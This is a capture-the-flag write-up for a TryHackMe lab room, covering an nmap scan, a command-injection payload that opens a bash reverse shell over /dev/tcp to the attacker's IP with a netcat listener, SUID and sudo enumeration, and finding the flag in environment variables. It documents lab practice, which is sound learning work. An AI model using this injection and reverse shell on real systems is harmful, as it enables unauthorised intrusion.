# TryHackMe: Epoch — Write-up

- **Target IP:** `10.129.141.31`
- **Attacker IP:** `192.168.132.149`

## 1. Reconnaissance

I started by running an Nmap scan against the target:

```bash
nmap -sV -sC 10.129.141.31
```

**Nmap results:**

```text
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9b:cd:42:e4:10:5b:0a:a4:09:e7:2a:11:24:09:86:ea (RSA)
|   256 64:23:ed:8e:f5:9e:0e:2d:58:63:67:7d:4d:7a:c9:81 (ECDSA)
|_  256 19:01:5c:e1:ae:1f:6a:0c:1b:c1:ae:ab:8a:1a:6a:9a (ED25519)
80/tcp open  http
```

Two ports were open: SSH (22) and HTTP (80).

## 2. Initial Access — Reverse Shell

On the web server, I tried the following command injection payload:

```bash
&/bin/bash -i >& /dev/tcp/192.168.132.149/4444 0>&1
```

After starting a listener with Netcat (`nc -lvnp 4444`), I gained a reverse shell:

```text
challenge@e7c1352e71ec:/$ whoami
challenge
```

## 3. Privilege Escalation Enumeration

We landed as the `challenge` user, and the goal was to reach root. I enumerated common privilege escalation vectors:

- SUID binaries:

  ```bash
  find / -type f -perm -4000 2>/dev/null
  ```

- sudo permissions:

  ```bash
  sudo -l
  ```

Nothing obvious came out of these checks.

## 4. Getting the Flag

After giving it some thought, I decided to list the environment variables of the current process with the `env` command, which revealed the flag:

```text
challenge@e7c1352e71ec:/$ env
HOSTNAME=e7c1352e71ec
PWD=/
HOME=/home/challenge
LS_COLORS=
GOLANG_VERSION=1.15.7
FLAG=flag{7da6c7debd40bd611560*********}
SHLVL=2
PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
OLDPWD=/dev
```

**Flag:** `flag{7da6c7debd40bd611560*********}`

## 5. Conclusion

This room was a good reminder that flags and secrets are not always obtained through full privilege escalation: sometimes simple enumeration of the environment (`env`) is enough to find sensitive data exposed in process variables.

**Key takeaway:** always check environment variables during post-exploitation — credentials and flags are frequently hidden there.
